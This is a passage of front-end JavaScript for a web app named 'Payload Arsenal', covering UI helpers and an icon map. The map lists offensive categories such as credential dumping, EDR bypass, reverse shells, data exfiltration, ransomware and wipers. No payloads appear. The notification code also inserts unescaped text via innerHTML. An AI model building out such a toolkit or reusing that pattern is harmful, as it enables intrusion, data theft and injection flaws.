        const sidebar = document.getElementById('sidebar');
        if (sidebar) {
            sidebar.classList.toggle('active');
        }
    }

    initializeTabSwitching() {
        const outputTabs = document.querySelectorAll('.output-tab');
        const tabContents = document.querySelectorAll('.tab-content');

        outputTabs.forEach(tab => {
            tab.addEventListener('click', () => {
                const targetTab = tab.dataset.tab;

                outputTabs.forEach(t => t.classList.remove('active'));
                tabContents.forEach(content => content.classList.remove('active'));

                tab.classList.add('active');

                const targetContent = document.getElementById(targetTab + 'Tab');
                if (targetContent) {
                    targetContent.classList.add('active');
                }
            });
        });
    }

    showNotification(message, type = 'info') {
        let container = document.getElementById('notificationContainer');
        if (!container) {
            container = document.createElement('div');
            container.id = 'notificationContainer';
            container.className = 'notification-container';
            document.body.appendChild(container);
        }

        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${this.getNotificationIcon(type)}"></i>
                <span>${message}</span>
            </div>
        `;

        container.appendChild(notification);
        setTimeout(() => notification.classList.add('show'), 100);
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                if (container.contains(notification)) {
                    container.removeChild(notification);
                }
            }, 300);
        }, 4000);
    }

    showLoadingIndicator(message = 'Loading...') {
        let indicator = document.getElementById('loadingIndicator');
        if (!indicator) {
            indicator = document.createElement('div');
            indicator.id = 'loadingIndicator';
            indicator.className = 'loading-indicator';
            indicator.innerHTML = `
                <div class="loading-content">
                    <div class="spinner"></div>
                    <span id="loadingText">${message}</span>
                </div>
            `;
            document.body.appendChild(indicator);
        }

        const text = document.getElementById('loadingText');
        if (text) {
            text.textContent = message;
        }
        indicator.style.display = 'flex';
        indicator.classList.add('active');
    }

    hideLoadingIndicator() {
        const indicator = document.getElementById('loadingIndicator');
        if (indicator) {
            indicator.classList.remove('active');
            setTimeout(() => {
                indicator.style.display = 'none';
            }, 300);
        }
    }

    getNotificationIcon(type) {
        const icons = {
            success: 'check-circle',
            error: 'exclamation-circle',
            warning: 'exclamation-triangle',
            info: 'info-circle'
        };
        return icons[type] || 'info-circle';
    }

    getPlatformIcon(platform) {
        const icons = {
            windows: 'fab fa-windows',
            linux: 'fab fa-linux',
            unix: 'fas fa-server',
            macos: 'fab fa-apple'
        };
        return icons[platform] || 'fas fa-desktop';
    }

    formatTitle(key) {
        return key.split('_').map(word => 
            word.charAt(0).toUpperCase() + word.slice(1)
        ).join(' ');
    }

    getSectionIcon(sectionId) {
        const icons = {
            system_info: 'fas fa-info-circle',
            network_recon: 'fas fa-network-wired',
            osint: 'fas fa-search',
            enumeration: 'fas fa-list',
            credential_dump: 'fas fa-key',
            password_attacks: 'fas fa-lock',
            token_theft: 'fas fa-user-secret',
            kerberos: 'fas fa-ticket-alt',
            windows_privesc: 'fas fa-crown',
            linux_privesc: 'fas fa-crown',
            unix_privesc: 'fas fa-crown',
            kernel_exploits: 'fas fa-bomb',
            av_evasion: 'fas fa-shield-alt',
            edr_bypass: 'fas fa-user-ninja',
            obfuscation: 'fas fa-mask',
            steganography: 'fas fa-eye-slash',
            windows_persistence: 'fas fa-history',
            linux_persistence: 'fas fa-history',
            bootkit: 'fas fa-cog',
            rootkit: 'fas fa-ghost',
            smb_lateral: 'fas fa-arrows-alt',
            wmi_lateral: 'fas fa-arrows-alt',
            ssh_lateral: 'fas fa-arrows-alt',
            rdp_lateral: 'fas fa-arrows-alt',
            c2_channels: 'fas fa-satellite-dish',
            covert_comms: 'fas fa-user-secret',
            dns_tunneling: 'fas fa-globe',
            web_shells: 'fas fa-terminal',
            data_exfil: 'fas fa-upload',
            dns_exfil: 'fas fa-upload',
            encrypted_exfil: 'fas fa-lock',
            cloud_exfil: 'fas fa-cloud-upload-alt',
            destruction: 'fas fa-bomb',
            ransomware: 'fas fa-skull-crossbones',
            denial_service: 'fas fa-ban',
            wiper: 'fas fa-eraser',
            payload_builder: 'fas fa-tools',
            encoder: 'fas fa-code',
            shellcode_gen: 'fas fa-terminal',
            reverse_shell: 'fas fa-exchange-alt'
        };
        return icons[sectionId] || 'fas fa-cog';
    }
}

// Initialize the application
document.addEventListener('DOMContentLoaded', () => {
    try {
        console.log('DOM loaded, initializing Payload Arsenal...');
        window.app = new PayloadArsenal();

        setTimeout(() => {
            if (window.app && typeof window.app.updateStats === 'function') {
                window.app.updateStats();
            }
        }, 100);

    } catch (error) {
        console.error('Failed to initialize Payload Arsenal:', error);

        const errorDiv = document.createElement('div');
        errorDiv.innerHTML = `
            <div style="
                position: fixed;
                top: 20px;
                right: 20px;
                background: #ef4444;
                color: white;
                padding: 16px;
                border-radius: 8px;
                z-index: 9999;
                max-width: 400px;
            ">
                <strong>Error:</strong> Failed to load application. Please refresh the page.
            </div>
        `;
        document.body.appendChild(errorDiv);
    }
});

// Global utility functions
window.app = null;
